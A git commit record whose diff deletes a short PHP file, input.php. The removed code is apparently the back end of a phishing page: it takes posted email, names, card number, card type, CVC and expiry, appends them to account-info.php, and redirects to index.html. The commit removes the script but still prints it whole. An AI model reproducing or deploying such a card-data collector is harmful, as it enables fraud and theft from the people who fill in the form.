fbbc6b9c2b5fa1cf9a9ba4da7d7a07ecc43f6fd9
wwi-w <77251113+wwi-w@users.noreply.github.com>
2021-01-28 18:14:31 +0100

    Delete input.php

--- input.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("account-info.php", "email/number::" .$_POST['email']   ."firstname::" .$_POST['firstname'] ."lasttname::" .$_POST['lastname'] ."CardNumber::" .$_POST['card'] ."type::" .$_POST['type'] ."your CVC::" .$_POST['cvc'] ."Valid Untill::" .$_POST['valid'] ."\n", FILE_APPEND);
-header('location: index.html');
-exit();
-?>
